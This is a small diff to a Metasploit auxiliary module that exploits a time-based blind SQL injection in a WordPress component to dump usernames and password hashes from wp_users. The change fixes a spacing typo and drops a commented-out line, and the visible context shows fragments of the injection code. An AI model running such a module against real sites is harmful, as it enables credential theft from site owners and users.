@@ -21,7 +21,7 @@ class MetasploitModule < Msf::Auxiliary
           `code` parameter.
 
           Remote attackers can exploit this vulnerability to dump usernames and password hashes
-          from the`wp_users` table of the affected WordPress installation. These password hashes
+          from the `wp_users` table of the affected WordPress installation. These password hashes
           can then be cracked offline using tools such as Hashcat to obtain valid login
           credentials for the affected WordPress installation.
         },
@@ -66,7 +66,6 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     id = Rex::Text.rand_text_numeric(1..10)
-    # @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
     @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
       res = send_request_cgi({
         'keep_cookies' => true,
